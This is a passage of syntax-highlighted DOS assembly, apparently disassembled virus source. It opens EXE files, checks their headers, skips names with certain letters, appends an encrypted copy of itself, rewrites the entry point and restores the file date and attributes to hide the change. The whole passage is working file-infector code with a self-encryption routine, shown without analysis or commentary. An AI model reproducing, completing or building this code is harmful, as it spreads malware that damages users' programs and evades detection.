   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09AA</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc2">06FE</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">RESTORE_CRIT_HANDLER</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">04301</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">077C</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">OPEN_FILE_FOR_READ_WRITE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">03D02</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">0771</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">GET_FILEDATE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">05700</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">06B4</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">075C</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09AC</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09AE</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">READ_AND_CHECK_EXE_HEADER</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">06AD</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0A49</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">01C</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">069A</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">075C</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0E8</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">020</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0A49</span><span class="sc4">],</span><span class="sc2">05A4D</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">075C</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0A5B</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">CLD</span><span class="sc0">
   </span><span class="sc6">REPNE</span><span class="sc0"> </span><span class="sc6">SCASW</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">0754</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09AE</span><span class="sc4">],</span><span class="sc2">01F</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">075C</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">READ_PAST_END_OF_FILE</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">075C</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_AND_WRITE_TO_FILE</span><span class="sc0">

</span><span class="sc5">RESTORE_ALTERED_DATE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">05701</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09AC</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09AE</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">06B4</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">CLOSE_THE_FILE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">03E</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">06B4</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">RESTORE_FILE_ATTRIBUTE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">04301</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09AA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">

</span><span class="sc5">RESTORE_CRIT_HANDLER</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">02524</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc2">09B8</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">

</span><span class="sc5">BAD_NAME</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">CHECK_LETTERS_IN_FILENAME</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
   </span><span class="sc6">CLD</span><span class="sc0">
   </span><span class="sc6">REPNE</span><span class="sc0"> </span><span class="sc6">SCASB</span><span class="sc0">
   </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">04353</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">SCASW</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">07B7</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc2">07A5</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">056</span><span class="sc0">
   </span><span class="sc6">REPNE</span><span class="sc0"> </span><span class="sc6">SCASB</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">07B7</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CLC</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">
   </span><span class="sc6">STC</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">READ_PAST_END_OF_FILE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,-</span><span class="sc2">0A</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">06A8</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0A65</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">069A</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0A65</span><span class="sc4">],</span><span class="sc2">0FDF0</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">07F0</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0A67</span><span class="sc4">],</span><span class="sc2">0AAC5</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">07F0</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,-</span><span class="sc2">9</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">06A8</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0A6B</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">0696</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">
   </span><span class="sc6">CLC</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">ENCRYPT_AND_WRITE_TO_FILE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">MOVE_TO_END_OF_FILE</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0A49</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0D</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc2">080C</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">OUT_OF_ENCRYPT</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0B</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0E</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">010</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MUL</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0B</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">010</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">083C</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">080</span><span class="sc0">
   </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0E</span><span class="sc4">],</span><span class="sc2">09B</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">016</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">010</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">014</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">06A4</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">09A4</span><span class="sc0">
   </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0D</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0A4D</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0A4B</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0B</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0A5F</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0A5D</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">COPY_TO_HIGH_MEMORY_ENCRYPT_WRITE</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09AE</span><span class="sc4">],</span><span class="sc2">01F</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09BC</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">01F</span><span class="sc0">
   </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0E8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0A5B</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">MOVE_TO_BEGINNING_OF_FILE</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">01C</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0A49</span><span class="sc0">

</span><span class="sc5">WRITE_THE_NEW_HEADER</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc2">0696</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
 </span><span class="sc5">OUT_OF_ENCRYPT</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">COPY_TO_HIGH_MEMORY_ENCRYPT_WRITE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">01A</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">020</span><span class="sc0">
   </span><span class="sc6">CLD</span><span class="sc0">
   </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">STOSW</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_STEP_ONE</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_STEP_TWO</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_STEP_THREE</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0E9</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">028C</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0A04</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
